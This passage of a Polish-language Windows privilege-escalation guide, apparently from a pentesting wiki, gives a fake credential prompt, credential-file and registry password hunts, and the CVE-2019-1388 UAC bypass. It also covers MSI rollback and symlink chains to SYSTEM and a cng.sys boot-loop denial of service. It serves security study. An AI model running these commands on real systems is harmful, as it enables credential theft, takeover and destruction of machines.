Możesz zawsze **poprosić użytkownika o wpisanie jego credentials, a nawet credentials innego użytkownika**, jeśli myślisz, że może je znać (zauważ, że **proszenie** klienta bezpośrednio o **credentials** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierających credentials**

Znane pliki, które jakiś czas temu zawierały **passwords** w **clear-text** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Przeszukaj wszystkie proponowane pliki:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Poświadczenia w RecycleBin

Powinieneś też sprawdzić Bin, aby poszukać w nim poświadczeń

Aby **odzyskać hasła** zapisane przez kilka programów, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru z poświadczeniami**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Wyodrębnij klucze openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Powinieneś sprawdzić bazy danych, w których są przechowywane hasła z **Chrome lub Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek, aby może jakieś **hasła są** tam zapisane.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **intercommunication** między komponentami oprogramowania w różnych językach. Każdy komponent COM jest **identyfikowany przez class ID (CLSID)**, a każdy komponent udostępnia funkcjonalność przez jedną lub więcej interfejsów, identyfikowanych przez interface IDs (IIDs).

Klasy i interfejsy COM są zdefiniowane w rejestrze pod **HKEY\CLASSES\ROOT\CLSID** oraz **HKEY\CLASSES\ROOT\Interface**. Ten rejestr jest tworzony przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Wewnątrz CLSID-ów tego rejestru możesz znaleźć podrzędny klucz rejestru **InProcServer32**, który zawiera **default value** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może być **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) lub **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

W skrócie, jeśli możesz **nadpisać dowolne z DLL-i**, które mają zostać uruchomione, możesz **eskalować uprawnienia**, jeśli ta DLL ma zostać uruchomiona przez innego użytkownika.

Aby dowiedzieć się, jak atakujący używają COM Hijacking jako mechanizmu persistence, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Szukaj zawartości plików**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Wyszukaj plik o określonej nazwie**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wspomniane na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sessions**, **usernames** i **passwords** kilku narzędzi, które zapisują te dane w postaci jawnego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Wyobraź sobie, że **proces uruchomiony jako SYSTEM otwiera nowy proces** (`OpenProcess()`) **z pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, ale dziedzicząc wszystkie otwarte uchwyty głównego procesu**.\
Następnie, jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do procesu uprzywilejowanego utworzony** przez `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby uzyskać więcej informacji o **tym, jak wykryć i wykorzystać tę podatność**.](leaked-handle-exploitation.md)\
[Przeczytaj **ten inny post, aby uzyskać pełniejsze wyjaśnienie, jak testować i nadużywać więcej otwartych handlerów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Współdzielone segmenty pamięci, określane jako **pipes**, umożliwiają komunikację między procesami i transfer danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, pozwalającą niepowiązanym procesom współdzielić dane, nawet w różnych sieciach. Przypomina to architekturę klient/serwer, z rolami zdefiniowanymi jako **named pipe server** i **named pipe client**.

Gdy dane są wysyłane przez **klienta** do pipe, **serwer**, który skonfigurował pipe, może **przyjąć tożsamość** **klienta**, o ile ma wymagane prawa **SeImpersonate**. Zidentyfikowanie **uprzywilejowanego procesu**, który komunikuje się przez pipe, który możesz naśladować, daje możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z pipe, który utworzyłeś. Instrukcje wykonania takiego ataku znajdziesz pomocnie [**tutaj**](named-pipe-client-impersonation.md) oraz [**tutaj**](#from-high-integrity-to-system).

Ponadto następujące narzędzie pozwala **przechwycić komunikację named pipe za pomocą narzędzia takiego jak burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a to narzędzie pozwala wyświetlić listę i zobaczyć wszystkie pipes, aby znaleźć privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny uwierzytelniony klient może nadużyć ścieżki asynchronicznych zdarzeń opartej na mailslot, aby zamienić `ClientAttach` w dowolny **4-byte write** do dowolnego istniejącego pliku zapisywalnego przez `NETWORK SERVICE`, a następnie uzyskać prawa administracyjne Telephony i załadować dowolny DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją przez `CreateFileW(..., OPEN_EXISTING)` i używa jej do asynchronicznych zapisów zdarzeń.
- Każde zdarzenie zapisuje kontrolowany przez atakującego `InitContext` z `Initialize` do tego uchwytu. Zarejestruj line app przez `LRegisterRequestRecipient` (`Req_Func 61`), wyzwól `TRequestMakeCall` (`Req_Func 121`), pobierz przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj/zakończ, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` z dowolną ścieżką do DLL, aby uruchomić `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej szczegółów:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Sprawdź stronę **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą wywołać niebezpieczne handlery URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany scheme) i uruchomić pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Podczas uzyskiwania shell jako użytkownik mogą istnieć zaplanowane zadania lub inne procesy uruchamiane, które **przekazują dane uwierzytelniające w command line**. Skrypt poniżej przechwytuje command lines procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wypisując wszelkie różnice.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kradzież haseł z procesów

## Z Low Priv User do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP) i UAC jest włączone, w niektórych wersjach Microsoft Windows możliwe jest uruchomienie terminala lub innego procesu jako "NT\AUTHORITY SYSTEM" z nieuprzywilejowanego użytkownika.

To umożliwia jednoczesną eskalację uprawnień i obejście UAC przy użyciu tej samej podatności. Dodatkowo nie ma potrzeby instalowania czegokolwiek, a binarka używana podczas tego procesu jest podpisana i wydana przez Microsoft.

Niektóre z dotkniętych systemów to:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Aby wykorzystać tę podatność, konieczne jest wykonanie następujących kroków:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Z Administrator Medium do High Integrity Level / UAC Bypass

Przeczytaj to, aby **dowiedzieć się o Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Z Arbitrary Folder Delete/Move/Rename do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) z kodem exploit [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Atak polega zasadniczo na nadużyciu funkcji rollback w Windows Installer, aby podmienić legalne pliki na złośliwe podczas procesu deinstalacji. W tym celu atakujący musi stworzyć **złośliwy instalator MSI**, który zostanie użyty do przejęcia folderu `C:\Config.Msi`, a następnie Windows Installer będzie go używał do przechowywania plików rollback podczas deinstalacji innych pakietów MSI, gdzie pliki rollback zostaną zmodyfikowane tak, aby zawierały złośliwy payload.

Podsumowana technika wygląda następująco:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Stwórz `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
- Oznacz instalator jako **"UAC Compliant"**, aby **non-admin user** mógł go uruchomić.
- Pozostaw otwarty **handle** do pliku po instalacji.

- Step 2: Begin Uninstall
- Odinstaluj ten sam `.msi`.
- Proces deinstalacji zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (rollback backups).
- **Poll the open file handle** za pomocą `GetFinalPathNameByHandle`, aby wykryć moment, gdy plik stanie się `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- `.msi` zawiera **custom uninstall action (`SyncOnRbfWritten`)** that:
- Sygnalizuje, gdy `.rbf` został zapisany.
- Następnie **waits** na inne zdarzenie przed kontynuowaniem deinstalacji.

- Step 4: Block Deletion of `.rbf`
- Gdy zostanie to zasygnalizowane, **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — to **uniemożliwia jego usunięcie**.
- Następnie **signal back**, aby deinstalacja mogła się zakończyć.
- Windows Installer nie może usunąć `.rbf`, a ponieważ nie może usunąć całej zawartości, **`C:\Config.Msi` nie zostaje usunięty**.

- Step 5: Manually Delete `.rbf`
- Ty (atacker) ręcznie usuwasz plik `.rbf`.
- Teraz **`C:\Config.Msi` jest puste**, gotowe do przejęcia.

> W tym momencie **trigger the SYSTEM-level arbitrary folder delete vulnerability** aby usunąć `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Odtwórz folder `C:\Config.Msi` samodzielnie.
- Ustaw **weak DACLs** (np. Everyone:F) i **keep a handle open** z `WRITE_DAC`.

- Step 7: Run Another Install
- Zainstaluj `.msi` ponownie, z:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Zmienna, która wymusza błąd.
- Ta instalacja zostanie użyta do ponownego wywołania **rollback**, który czyta `.rbs` i `.rbf`.

- Step 8: Monitor for `.rbs`
- Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi`, aż pojawi się nowy `.rbs`.
- Przechwyć jego nazwę pliku.

- Step 9: Sync Before Rollback
- `.msi` zawiera **custom install action (`SyncBeforeRollback`)** that:
- Sygnalizuje zdarzenie, gdy `.rbs` zostanie utworzony.
- Następnie **waits** przed kontynuowaniem.

- Step 10: Reapply Weak ACL
- Po otrzymaniu zdarzenia `.rbs created`:
- Windows Installer **reapplies strong ACLs** do `C:\Config.Msi`.
- Ale ponieważ nadal masz uchwyt z `WRITE_DAC`, możesz **reapply weak ACLs** ponownie.

> ACLs są **enforced tylko przy otwieraniu handle**, więc nadal możesz zapisywać do folderu.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Nadpisz plik `.rbs` fałszywym rollback script, który nakazuje Windows:
- Przywrócić Twój plik `.rbf` (malicious DLL) do **privileged location** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Umieścić Twój fałszywy `.rbf` zawierający **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Zasygnalizuj event sync, aby instalator wznowił działanie.
- **type 19 custom action (`ErrorOut`)** jest skonfigurowany tak, aby **intentionally fail the install** w znanym punkcie.
- To powoduje rozpoczęcie **rollback**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Odczytuje Twój złośliwy `.rbs`.
- Kopiuje Twój DLL `.rbf` do docelowej lokalizacji.
- Teraz masz swój **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Uruchom zaufany **auto-elevated binary** (np. `osk.exe`), który ładuje DLL, który przejąłeś.
- **Boom**: Twój kod zostaje wykonany **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Główna technika MSI rollback (ta poprzednia) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co jeśli Twoja podatność pozwala tylko na **arbitrary file deletion** ?

Możesz wykorzystać **NTFS internals**: każdy folder ma ukryty alternate data stream o nazwie:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ten strumień przechowuje **index metadata** folderu.

Więc jeśli **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usuwa cały folder** z filesystem.

Możesz to zrobić, używając standardowych API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Nawet jeśli wywołujesz API usuwania *pliku*, ono **usuwa sam folder**.

### From Folder Contents Delete to SYSTEM EoP
A co jeśli twój primitive nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać zawartość folderu kontrolowanego przez atakującego**?

1. Step 1: Setup a bait folder and file
- Utwórz: `C:\temp\folder1`
- Wewnątrz: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Krok 3: Wywołaj proces SYSTEM (np. `SilentCleanup`)
- Ten proces skanuje foldery (np. `%TEMP%`) i próbuje usunąć ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do twojego callbacka.

4. Krok 4: W obrębie callbacka oplocka – przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` gdzie indziej
- To opróżnia `folder1` bez łamania oplocka.
- Nie usuwaj `file1.txt` bezpośrednio — to zwolniłoby oplock przedwcześnie.

- Opcja B: Zamień `folder1` w **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> To atakuje wewnętrzny strumień NTFS, który przechowuje metadane folderu — usunięcie go usuwa folder.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Wynik**: `C:\Config.Msi` jest usuwany przez SYSTEM.

### Od Arbitrary Folder Create do Permanent DoS

Wykorzystaj prymityw, który pozwala Ci **utworzyć dowolny folder jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```
- Ta ścieżka normalnie odpowiada sterownikowi jądra `cng.sys`.
- Jeśli **najpierw utworzysz ją jako folder**, Windows nie zdoła załadować właściwego sterownika podczas bootowania.
- Następnie Windows próbuje załadować `cng.sys` podczas bootowania.
- Widzi folder, **nie może rozpoznać właściwego sterownika** i **crashuje albo zatrzymuje boot**.
- **Nie ma fallbacku** i **nie ma recovery** bez zewnętrznej interwencji (np. naprawy boot albo dostępu do dysku).

### Z privileged log/backup paths + OM symlinks do arbitrary file overwrite / boot DoS

Gdy **privileged service** zapisuje logi/eksporty do ścieżki pobieranej z **writable config**, przekieruj tę ścieżkę za pomocą **Object Manager symlinks + NTFS mount points**, aby zamienić privileged write w arbitrary overwrite (nawet **bez** SeCreateSymbolicLinkPrivilege).

**Wymagania**
- Config przechowujący ścieżkę docelową jest zapisywalny przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia mount point do `\RPC Control` oraz OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Privileged operation, która zapisuje do tej ścieżki (log, export, report).

**Przykładowy chain**
1. Odczytaj config, aby odzyskać privileged log destination, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator uruchamia "send test SMS"). Zapis teraz trafia do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany cel (parser hex/PE), aby potwierdzić uszkodzenie; restart wymusza na Windows załadowanie podmienionej ścieżki sterownika → **boot loop DoS**. To także uogólnia się do każdego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli kopia istnieje w `C:\Windows\System32\cng.sys`, może zostać najpierw użyta próba jej załadowania, co czyni z niej niezawodny DoS sink dla uszkodzonych danych.



## **From High Integrity to System**

### **New service**

Jeśli już działasz w procesie o High Integrity, **ścieżka do SYSTEM** może być łatwa — wystarczy **utworzyć i uruchomić nową usługę**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
